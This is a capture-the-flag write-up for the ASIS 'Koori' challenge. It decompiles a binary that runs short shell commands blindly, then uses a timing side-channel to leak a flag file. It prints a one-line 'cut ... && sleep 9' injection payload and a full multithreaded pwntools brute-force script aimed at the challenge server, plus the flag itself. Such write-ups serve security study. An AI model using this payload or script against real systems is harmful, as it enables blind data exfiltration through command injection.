# Koori

```
Only someone afflicted with Koori must strengthen their other senses! Is there anything that can take the place of the eyes?

nc 65.109.210.228 31333
```

Decompile the attachment in Ghidra:

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  undefined1 auStack_130 [24];
  char input [256];
  long local_18;
  
  local_18 = ___stack_chk_guard;
  setbuf(_stdout,(char *)0x0);
  setbuf(_stdin,(char *)0x0);
  FUN_00100dd8(auStack_130);
  printf("Please send your input :) ");
  fgets(input,0x100,_stdin);
  sVar2 = strcspn(input,"\n");
  input[sVar2] = '\0';
  sVar2 = strlen(input);
  if (0x20 < sVar2) {
    puts("Sorry, your input is too lengthy :|");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  FUN_00100e54(auStack_130);
  iVar1 = FUN_00100f24(input,0xe);
  if (iVar1 != 0) {
    puts("The input timed out :(");
  }
  FUN_00100ea4(auStack_130);
  puts("Your input has been validated :D");
  if (local_18 - ___stack_chk_guard != 0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(&__stack_chk_guard,0,0,local_18 - ___stack_chk_guard);
  }
  return 0;
}


/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_00100f24(undefined8 param_1,int param_2)

{
  __pid_t _Var1;
  undefined8 uVar2;
  time_t __time1;
  double dVar3;
  uint local_28;
  __pid_t local_24;
  time_t local_20;
  long local_18;
  
  local_18 = ___stack_chk_guard;
  local_24 = fork();
  if (local_24 == 0) {
    execl("/bin/sh","sh",&DAT_001011e8,param_1,0);
    perror("Failed :(");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (local_24 < 0) {
    perror("ERR :|");
    uVar2 = 0xffffffff;
  }
  else {
    local_20 = time((time_t *)0x0);
    while (_Var1 = waitpid(local_24,(int *)&local_28,1), _Var1 == 0) {
      __time1 = time((time_t *)0x0);
      dVar3 = difftime(__time1,local_20);
      if ((double)param_2 < dVar3) {
        kill(local_24,9);
        waitpid(local_24,(int *)0x0,0);
        uVar2 = 0xffffffff;
        goto LAB_00101058;
      }
      sleep(1);
    }
    if ((local_28 & 0x7f) == 0) {
      uVar2 = 0;
    }
    else {
      uVar2 = 0xffffffff;
    }
  }
LAB_00101058:
  if (local_18 - ___stack_chk_guard != 0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(&__stack_chk_guard,uVar2,0,local_18 - ___stack_chk_guard);
  }
  return uVar2;
}
```

It executes the provided shell command (length <= 0x20) with a timeout. The stdin/stdout/stderr are redirect to /dev/null, so we cannot use them to leak data. Instead, we can use time as the side channel to leak data.

Following the same blind execution process of <https://wr3nchsr.github.io/cyctf-blindexec-writeup/>, attack in steps:

1. for each character position `idx` and possible character `c`, execute:

```shell
[ `cut -c{idx} f*` = {c} ]&&sleep 9
```

2. if it finishes before 9s, the condition is not satisfied; otherwise, we found a match

Based on the multithreaded exploit code from <https://wr3nchsr.github.io/cyctf-blindexec-writeup/>, here is the attack code for this challenge:

```python
import pwn
import string
import itertools
import time
from threading import Thread

bruteforce_pool = (
    string.ascii_lowercase + string.ascii_uppercase + string.digits + "}{_!-;:"
)
keys = {}
for c in bruteforce_pool:
    keys[c] = 0


def check(idx, c):
    global keys
    io = pwn.remote("65.109.210.228", 31333)
    payload = f"[ `cut -c{idx} f*` = {c} ]&&sleep 9"
    io.sendlineafter(b"Please send your input :)", payload.encode())
    output = io.recvline(timeout=8)
    if b"Your input has been validated :D" not in output:
        keys[c] = 1
    io.close()


def main():
    global keys
    flag = ""
    logging = pwn.log.progress("Flag")
    while not flag.endswith("}"):
        print(flag)
        # run simultaneous connections for each possible character
        for batch in itertools.batched(bruteforce_pool, 6):
            threads = list()
            for c in batch:
                t = Thread(target=check, args=(len(flag) + 1, c))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            print(keys, flag)

            # break early
            counter = 0
            for i in keys:
                if keys[i]:
                    counter += 1
            if counter == 1:
                break

        # check for false positives or no output
        counter = 0
        for i in keys:
            if keys[i]:
                counter += 1
        if counter != 1:
            for i in keys:
                keys[i] = 0
            time.sleep(1)
            continue

        # get correct value
        for k in keys:
            if keys[k]:
                flag += k
                logging.status(flag)
                keys[k] = 0
                break
    logging.success(flag)


if __name__ == "__main__":
    main()
```

Flag: `ASIS{bl!nD_3XeCuTi0n!}`.
